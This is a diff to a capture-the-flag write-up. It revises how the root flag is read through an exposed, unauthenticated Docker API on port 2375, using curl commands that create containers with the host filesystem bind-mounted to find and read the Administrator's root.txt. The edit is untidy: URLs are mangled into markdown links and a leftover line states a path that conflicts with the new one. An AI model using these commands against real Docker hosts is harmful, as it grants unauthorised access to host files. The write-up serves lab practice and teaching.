@@ -218,25 +218,32 @@ curl -H "Content-Type: application/json" \
 cid=cb9e83b09f97c6e3eeb97c62987e75256840529d0796cba43ec5e392a4950035
 curl -X POST http://192.168.65.7:2375/containers/$cid/start
 ```
-
-3. Execute command to read root flag:
-```bash
-# Create exec session
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"AttachStdout": true, "Cmd": ["cat", "/mnt/host_root/Users/Administrator/Desktop/root.txt"]}' \
-  http://192.168.65.7:2375/containers/$cid/exec
-
-# Response: {"Id":"901b92f9a387..."}
-
-# Start exec and retrieve output
-exec_id=901b92f9a3870cceed03c2dc112b6fc76125173ce20c153981a635426951e58a
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"Detach": false, "Tty": false}' \
-  http://192.168.65.7:2375/exec/$exec_id/start
+3. Locate root flag (initial path failed):
 ```
 
+# First attempt with simple path failed
+# Used find to discover actual filesystem structure
+curl -H "Content-Type: application/json" \
+  -d '{"Image":"alpine:latest","Cmd":["find","/mnt/host_root/parent-distro","-name","*.txt"],"HostConfig":{"Binds":["/:/mnt/host_root"]}}' \
+  [http://192.168.65.7](http://192.168.65.7):2375/containers/create
+cid_find=3ee63229edff5f1eb765b3b22882c0506e867175505ce513ff2dae0cd04ddec0
+curl -X POST [http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_find/start
+sleep 2
+curl "[http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_find/logs?stdout=true&stderr=true" 2>/dev/null | strings
+
+Discovery: Actual path is /mnt/host_root/parent-distro/mnt/host/c/Users/Administrator/Desktop/root.txt
 **Result:** Root flag retrieved from `/mnt/host_root/Users/Administrator/Desktop/root.txt`
 
+```
+## Read root flag with the path : 
+curl -H "Content-Type: application/json" \
+  -d '{"Image":"alpine:latest","Cmd":["cat","/mnt/host_root/parent-distro/mnt/host/c/Users/Administrator/Desktop/root.txt"],"HostConfig":{"Binds":["/:/mnt/host_root"]}}' \
+  [http://192.168.65.7](http://192.168.65.7):2375/containers/create
+
+cid_root=<NEW_CONTAINER_ID>
+curl -X POST [http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_root/start
+sleep 2
+curl "[http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_root/logs?stdout=true&stderr=true" 2>/dev/null | strings
 ---
 
 ## 5. Flags
